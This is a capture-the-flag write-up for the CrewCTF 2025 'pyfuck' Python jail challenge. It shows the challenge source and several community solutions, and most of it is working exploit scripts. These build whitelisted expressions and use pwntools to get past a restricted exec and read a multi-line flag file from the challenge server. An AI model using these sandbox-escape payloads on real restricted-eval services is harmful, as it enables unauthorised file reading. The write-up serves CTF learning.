# CrewCTF 2025 pyfuck

```
Do you really know python?

Resource: https://pywtf.seall.dev/

ncat --ssl pyfck.chal.crewc.tf 1337

author : sealldev & KabirAcharya
```

Attachment:

```python
#!/usr/bin/python3

"""
The flag is stored at 'Flag.txt' across multiple lines e.g. c\nr\ne\nw\n{\n...
"""

allowed_builtins = {
    'next': next,
    'chr': chr,
    'ord': ord,
    'max': max,
    'min': min,
    'bin': bin,
    'int': int,
    'len': len,
    'str': str,
    'set': set,
    'hex': hex,
    'print': print,
    'range': range,
    'open': open
}

whitelist = "abcdefghijklmnopqrstuvwxyz()+"

security_check = lambda s: any(c not in whitelist for c in s) or s.count('+') > 12 or len(s) > 340 or 'print' in s

print('Welcome to pyfuck <3')
print('Good luck!')
print('- sealldev & KabirAcharya')
while True:
    cmd = input("Input: ")
    if security_check(cmd):
        print("No dice!")
    else:
        try:
            exec("print("+cmd+")", {'__builtins__': allowed_builtins}, {})
        except:
            print("No dice!")
```

Requirement:

1. Only alphabetic characters, parentheses and plus sign: use plus sign to construct string, generator syntax and function call
2. Limited builtins and count of `+`: search for a short combination to create the intended string

## Writeups on Discord

Writeup by @oh_word on Discord:

```python
set(
 x+next(y)
 for(y)in(set(open(<combination to get /Flag.txt string>)for(x)in(str(int()))))
 for(x)in(next(open(int())))
)

You can use the generator to store the opened flag file in a var, then using stdin you can send 38 bytes in a specific order and sort them from the set that gets returned
```

Writeup by @nikost on Discord:

```python
set(next((str(i)+next(f)for(i)in(range(38)))for(f)in(open("Flag.txt")for(x)in(range(1)))))
```

Writeup by @Leonardo on Discord:

```python
from pwn import *
import itertools


def decrease(x, n=1):
    for _ in range(n):
        x = f"max(range({x}))"
    return x


def find_combinations(n, target, nums):
    return [comb for comb in itertools.combinations_with_replacement(nums, n) if sum(comb) == target]


def set_value(value, x):
    if type(value) is int:
        if value not in numbers or len(x) < len(numbers[value]):
            numbers[value] = x
        char = chr(value)
        chr_expr = f"chr({x})"
        if char not in characters or len(chr_expr) < len(characters[char]):
            characters[char] = chr_expr
    elif type(value) is str and len(value) == 1:
        if value not in characters or len(x) < len(characters[value]):
            characters[value] = x
        ord_expr = f"ord({x})"
        o = ord(value)
        if o not in numbers or len(ord_expr) < len(numbers[o]):
            numbers[o] = ord_expr


allowed_builtins = {
    "next": next,
    "chr": chr,
    "ord": ord,
    "max": max,
    "min": min,
    "bin": bin,
    "int": int,
    "len": len,
    "str": str,
    "set": set,
    "hex": hex,
    # "print": print,
    "range": range,
    "open": open,
}

characters = {}
numbers = {}

exprs = [
    *allowed_builtins,
    *[fn + "()" for fn in allowed_builtins],
    "range(int())",
    "bin(int())",
    "int(not())",
    "()",
    "()in()",
    "not()",
]

for expr in exprs:
    for value in [expr, f"str({expr})"]:
        for fn in [False, "len", "min", "max"]:
            x = f"{fn}({value})" if fn else value
            try:
                res = eval(x)
                set_value(res, x)
            except:
                pass

for value in list(numbers.values()):
    exprs = [f"len(bin({value}))", f"len(hex({value}))"]
    for x in exprs:
        res = eval(x)
        set_value(res, x)

for i in range(1, 10):
    if i in numbers:
        x = f"str({numbers[i]})"
        res = eval(x)
        set_value(res, x)


for n in list(numbers):
    for i in range(1, 3):
        if n - i > 0:
            x = decrease(numbers[n], i)
            set_value(n - i, x)

nums = sorted(numbers)

for i in range(128):
    combs = find_combinations(2, i, nums)
    for comb in combs:
        x = "+".join(numbers[c] for c in comb)
        set_value(i, x)





flag_file = "+".join(characters[c] for c in "Flag.txt")

payload = f"set((next(f) + str(i)) for (f) in (open({flag_file}) for (i) in (str(int()))) for (i) in (range({numbers[38]})))".replace(" ", "")
print()
print(len(payload), payload.count("+"))
print(payload)

r = remote("pyfck.chal.crewc.tf", 1337, ssl=True)

r.recvuntil(b"Input: ")
r.sendline(payload.encode())
l = r.recvline().strip().decode()
data = pwnlib.util.safeeval.const(l)

data = [x.split("\n") if "\n" in x else [x[0], x[1:]] for x in data]
data = [[int(i), x] for x, i in data]
data.sort()
flag = "".join(x for i, x in data[1:])
print(flag)
```

Writeup by @Muhammed.  on Discord:

```python
from pwn import *
import json

numbers = {
    1: 'not()',
    2: '(not())+(not())',
    3: 'len(hex(int()))',
    4: 'len(str(not()))',
    5: 'len(str(set()))',
    6: 'len(bin(len(str(int))))',
    7: 'len(bin(len(str(open))))',
    8: 'len(str(not()))+len(str(not()))',
    9: 'len(str(not()))+len(str(not(not())))',
    10: 'len(str(not(not()))+str(not(not())))',
    11: 'len(str(range(int())))',
    12: 'len(str(range(ord(str(int())))))',
    13: 'len(str(set))',
    14: 'len(str(set))+int(not())',
    15: 'len(str(range))',
    16: 'len(str(range))+int(not())',
    17: 'len(set(str(hex)))+int(not())',
    18: 'len(str(()in())+str(set))',
    19: 'len(str(not())+str(range))',
    20: 'len(str(()in())+str(range))',
    21: 'len(set(str(hex)))+len(str(()in()))',
    22: 'len(set(str(int)))+len(set(str(int)))',
    23: 'len(str(len))',
    24: 'len(str(open))',
    25: 'len(str(open))+(not())',
    26: 'len(str(len))+len(hex(int()))',
    27: 'len(str(len))+len(str(not()))',
    28: 'len(str(()in())+str(bin))',
    29: 'len(str(()in())+str(open))',
    30: 'len(str(range))+len(str(range))',
    31: 'len(str(range))+len(set(str(hex)))',
    32: 'ord(min(str(chr)))',
    33: 'ord(min(str(chr)))+(not())',
    34: 'len(str(ord)+str(range(not())))',
    35: 'len(str(open)+str(range(not())))',
    36: 'len(str(ord))+len(str(set))',
    37: 'len(str(open))+len(str(set))',
}

letters = {
    "F": 'min(str(()in()))',
    'l': 'chr(len(str(open))+ord(min(str(not()))))',
    'a': 'chr(ord(str(int()))+ord(str(int(not()))))',
    'g': 'chr(len(str(ord))+len(str(set(str(max)))))',
    '.': 'chr(len(str(len))+len(str(len)))',
    't': 'max(str(int))',
    'x': 'max(str(hex))'
}

flag = ""
payload = 'set(next(i)if(set(next(i)for(n)in(range(NUMBERS))))else()for(i)in(open(PATH)for(i)in(str(chr))))'
PATH = letters['F']+"+"+letters['l']+"+"+letters['a']+"+"+letters['g']+"+"+letters['.']+"+"+letters['t']+"+"+letters['x']+"+"+letters['t']

r = remote("pyfck.chal.crewc.tf", 1337, ssl=True)

for i in range(4):
    d = r.recvline()

for line in range(1,38):
    craft = payload.replace("PATH", PATH)
    craft = craft.replace("NUMBERS", numbers[line]).encode()
    r.sendline(craft)
    flag += r.recvline().decode().split()[1][2]

print("[+] FLAG:", flag)
```

## Reproduction of writeups on discord

First, we need to find a combination that evaluates to `Flag.txt`. Based on code generated by Claude, python code is written to find a solution:

```python
from itertools import combinations_with_replacement
from collections import defaultdict

# atomic expressions we can use (names are the strings you can type)
atoms = {
    # 1
    "not()": int(not ()),
    # 3
    "len(str(bin(int())))": len(str(bin(int()))),
    # 4
    "len(str(not()))": len(str(not ())),
    # 5
    "len(str(set()))": len(str(set())),
    # 6
    "len(bin(len(str(int))))": len(bin(len(str(int)))),
    # 7
    "len(bin(len(str(open))))": len(bin(len(str(open)))),
    # 8
    "len(bin(len(str(set(str(range(int())))))))": len(
        bin(len(str(set(str(range(int()))))))
    ),
    # 11
    "len(str(range(int())))": len(str(range(int()))),
    # 13
    "len(str(int))": len(str(int)),
    # 15
    "len(str(range))": len(str(range)),
    # 23
    "len(str(chr))": len(str(chr)),
    # 24
    "len(str(open))": len(str(open)),
    # 25
    "len(str(set(str(()in()))))": len(str(set(str(() in ())))),
    # 32
    "ord(min(str(open)))": ord(min(str(open))),
    # 40
    "ord(min(str(set())))": ord(min(str(set()))),
    # 48
    "ord(str(int()))": ord(str(int())),
    # 49
    "ord(str(int(not())))": ord(str(int(not ()))),
    # 50
    "len(str(set(str(range(int())))))": len(str(set(str(range(int()))))),
    # 65
    "len(str(set(str(set(str(range(int())))))))": len(
        str(set(str(set(str(range(int()))))))
    ),
    # 70
    "ord(min(str(()in())))": ord(min(str(() in ()))),
    # 75
    "len(str(set(str(open))))": len(str(set(str(open)))),
    # 80
    "len(str(set(str(max))))": len(str(set(str(max)))),
    # 84
    "ord(min(str(not())))": ord(min(str(not ()))),
    # 97
    "max(range(ord(max(bin(int())))))": max(range(ord(max(bin(int()))))),
    # 98
    "ord(max(bin(int())))": ord(max(bin(int()))),
    # 100
    "len(str(set(str(set(str(set(str(ord))))))))": len(
        str(set(str(set(str(set(str(ord)))))))
    ),
    # 114
    "ord(max(str(range(int()))))": ord(max(str(range(int())))),
    # 115
    "ord(max(str(range)))": ord(max(str(range))),
    # 115
    "ord(max(str(()in())))": ord(max(str(() in ()))),
    # 116
    "ord(max(str(int)))": ord(max(str(int))),
    # 117
    "ord(max(str(not()in())))": ord(max(str(not () in ()))),
    # 120
    "ord(max(str(hex)))": ord(max(str(hex))),
}

print("Atomic values (name -> value):")
for k, v in atoms.items():
    print(f"{k} -> {v}")

# targets: ascii codes of "Flag.txt"
targets = [ord(c) for c in "Flag.txt"]
print("Targets:", targets)

# convert to list of (expr, value) for easier usage
atom_list = list(atoms.items())
values = [v for (_, v) in atom_list]

# For each target, find combinations of up to N summands (we will limit to low N)
max_summands_per_target = 3  # increase if you want to search longer
combos_for_target = {}
for t in targets:
    combos = []
    for r in range(1, max_summands_per_target + 1):
        for combo in combinations_with_replacement(range(len(values)), r):
            s = sum(values[i] for i in combo)
            if s == t:
                combos.append(combo)
    combos_for_target[t] = combos
    print(
        f"Target {t} found {len(combos)} combinations (limited search): {['+'.join([str(values[i]) for i in combo]) for combo in combos]}"
    )

def find(limit):
    # Now attempt to pick one combination for each target such that
    # total number of atomic summands across all targets <= limit
    solutions = []


    def dfs(i, current_terms, selection):
        # i: index in targets
        if i == len(targets):
            if current_terms <= limit:
                solutions.append(list(selection))
            return
        for combo in combos_for_target.get(targets[i], []):
            new_terms = current_terms + len(combo)
            if new_terms > limit:
                continue
            selection.append(combo)
            dfs(i + 1, new_terms, selection)
            selection.pop()


    dfs(0, 0, [])

    if not solutions:
        print(
            "No solution found with current atom set and limits (likely infeasible under +<=12)."
        )
    else:
        print("Found solutions! Building payload...")

        # build a textual payload from solutions
        result = []
        for sol in solutions:
            # helper to convert combo indices to expression sum
            def combo_to_expr(combo):
                parts = [atom_list[i][0] for i in combo]
                return "+".join(parts)

            chr_parts = []
            for combo in sol:
                expr = combo_to_expr(combo)
                # simplify chr(ord(x)) -> x
                if expr.startswith("ord(") and expr.endswith(")") and "+" not in expr:
                    chr_parts.append(expr.removeprefix("ord(").removesuffix(")"))
                else:
                    chr_parts.append(f"chr({expr})")
            payload = "+".join(chr_parts)
            # full expression to send to the challenge
            final = f"open({payload})"
            # count pluses
            plus_count = final.count("+")
            result.append((final, plus_count, len(final)))

        final, plus_count, len_final = min(result, key=lambda x: x[2])
        print("Payload:", final)
        print("Plus count:", plus_count)
        print("Length:", len_final)

find(11)
```

Output:

```
Found solutions! Building payload...
Payload: open(min(str(()in()))+chr(len(str(open))+ord(min(str(not()))))+chr(max(range(ord(max(bin(int()))))))+chr(len(str(set()))+ord(max(bin(int()))))+chr(len(str(chr))+len(str(chr)))+max(str(int))+max(str(hex))+max(str(int)))
Plus count: 10
Length: 218
```

Using 10 `+` allows us to use two more in the rest part.

Now the next thing is to extract the result from file. If the flag file contains flag in its first line, we are done. However, the flag is separated in many lines, and the only thing that can handle iterator is `set()`, which makes it hard to recover the flag.

### Method 1. Combine line with text read from stdin

The first method is from @oh_word on Discord. The idea is to combine the line of the flag file with text read from stdin, so that we can recover the order and avoid deduplication:

```python
from pwn import *
import string

context(log_level="debug")

# send 38(29 bytes locally) bytes (including newline) to distinguish lines

# length = 29
# p = process(["python3", "main.py"])
length = 38
p = process("ncat --ssl pyfck.chal.crewc.tf 1337".split())

p.recvuntil(b"Input: ")
flag_open = "open(min(str(()in()))+chr(len(str(open))+ord(min(str(not()))))+chr(max(range(ord(max(bin(int()))))))+chr(len(str(set()))+ord(max(bin(int()))))+chr(len(str(chr))+len(str(chr)))+max(str(int))+max(str(hex))+max(str(int)))"
p.sendline(
    f"""set(
           x + next(y)
           for (y) in (set({flag_open} for (x) in (str(int()))))
           for (x) in (next(open(int()))))""".replace(
        " ", ""
    )
    .replace("\n", "")
    .encode()
)
sent = string.ascii_letters[: length - 1]
p.sendline(sent.encode())
# recover
res = p.recvline()
res = eval(res.decode())
for ch in sent[1:] + "\n":
    for x in res:
        if x.startswith(ch):
            print(x[1], end="")
```

Note that the number of bytes sent must be accurate, otherwise it will fail with StopIteration error or the result will be truncated. We can increase the length until it fails.

There is a little trick that maintains the file object and allow you to call `next` on it: `for (y) in (set(generator))` so that y becomes the only element computed by the generator.

Flag: `crew{mult1l1n3_fl@gs_4r3_4_r34l_p41n}`.

# Method 2. Combine line with range(38)

Alternatively, instead of combining with text read from stdin, we can combine it with range(38), which should do the similar thing. But it requires more length, so a shorter way to find `Flag.txt` is required. The rest part is similar. The method is used by @nikost, @Leonardo and @Muhammed. on Discord.

```python
from pwn import *
import string

context(log_level="debug")

# flag_len = "len(str(set()))+len(str(open))"  # 5 + 24 = 29
# p = process(["python3", "main.py"])
flag_len = "len(str(range))+len(str(chr))"  # 15 + 23 = 38
p = process("ncat --ssl pyfck.chal.crewc.tf 1337".split())

p.recvuntil(b"Input: ")
flag_open = "open(min(str(()in()))+chr(len(str(open))+ord(min(str(not()))))+chr(max(range(ord(max(bin(int()))))))+chr(len(str(set()))+ord(max(bin(int()))))+chr(len(str(chr))+len(str(chr)))+max(str(int))+max(str(hex))+max(str(int)))"
p.sendline(
    f"""set(
           str(x) + next(y)
           for (y) in (set({flag_open} for (x) in (str(int()))))
           for (x) in (range({flag_len})))""".replace(
        " ", ""
    )
    .replace("\n", "")
    .encode()
)
# recover
res = p.recvline()
res = eval(res.decode())
for ch in [str(x) for x in range(38)][1:]:
    for x in res:
        if x.startswith(ch) and len(ch) + 1 < len(x) and x[len(ch) + 1] == "\n":
            print(x[len(ch) : len(ch) + 1], end="")
```


Flag: `crew{mult1l1n3_fl@gs_4r3_4_r34l_p41n}`.
